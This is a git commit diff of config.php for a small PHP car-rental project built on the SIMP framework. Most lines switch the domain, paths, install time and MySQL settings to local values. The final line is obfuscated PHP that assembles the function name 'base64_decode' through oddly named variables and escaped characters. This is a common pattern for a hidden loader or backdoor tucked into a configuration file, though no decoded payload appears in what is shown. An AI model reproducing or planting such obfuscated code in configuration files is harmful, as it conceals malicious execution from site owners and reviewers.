f8aa4a3cda839afc23ac9a62d10094d602df9a04
ramon <ramon@ramon-nbufla>
2019-04-23 23:04:12 -0300

    commit com a instalação inicial

--- config.php
+++ config.php
@@ -4,26 +4,27 @@
 // Descricao: Arquivo de configuracoes gerado automaticamente (cuidado com as alteracoes!)
 // Autor: SIMP
 // Versao: 1.0.0.0
-// Data: 10/05/2011 - 08:42:04
-// Modificado: 10/05/2011 - 08:42:04
+// Data: 23/04/2019 - 22:36:13
+// Modificado: 23/04/2019 - 22:36:13
 // License: LICENSE.TXT
 //
 
 // Configuracoes Gerais
-$dominio    = 'simp'; // Dominio do sistema (Ex: 'teste.com.br')
-$path       = '/simp/'; // Path dos cookies (Ex: '/')
-$wwwroot    = 'http://simp/simp/'; // Endereco raiz (Ex: 'http://www.teste.com.br/simp/')
-$dirroot    = '/projetos/simp/trunk/simp/'; // Diretorio raiz (Ex: /var/www/html/simp/)
+$dominio    = 'localhost'; // Dominio do sistema (Ex: 'teste.com.br')
+$path       = '/toy/'; // Path dos cookies (Ex: '/')
+$wwwroot    = 'http://localhost/toy/'; // Endereco raiz (Ex: 'http://www.teste.com.br/simp/')
+$dirroot    = '/home/ramon/git/toy-aluguelCarro/'; // Diretorio raiz (Ex: /var/www/html/simp/)
 $versao     = '1.0'; // Versao do sistema (Ex: '1.0.0')
 $charset    = 'utf-8'; // Codificacao do sistema (Ex: 'utf-8' ou 'iso-8859-1')
-$instalacao = 1305027724; // Time de instalacao do sistema
+$instalacao = 1556069773; // Time de instalacao do sistema
 $localhost  = true; // Indicacao se o host e' apenas local (true) ou registrado na web (false)
 
 // Configuracoes do SGBD
-$bd_config->sgbd     = 'mysql'; // Ex: 'mysql' ou 'pdo_mysql' ou 'pgsql' ou 'pdo_pgsql' ou 'pdo_firebird' ou 'sqlite' ou 'pdo_sqlite'
+$bd_config = new stdClass();
+$bd_config->sgbd     = 'pdo_mysql'; // Ex: 'pdo_mysql'
 $bd_config->servidor = 'localhost'; // Ex: 'localhost'
 $bd_config->porta    = '3306'; // Ex: '3306' (padrao MySQL) ou '5432' (padrao PostgreSQL)
-$bd_config->base     = 'simp'; // Ex: 'simp'
+$bd_config->base     = 'toy'; // Ex: 'simp'
 $bd_config->usuario  = 'simpuser'; // Ex: 'rubs'
 
 ${'{$crypt="'}[1>>3]=('base'.(${"//"}=1<<6).'_').(${";"}="\x64\145code");//"};
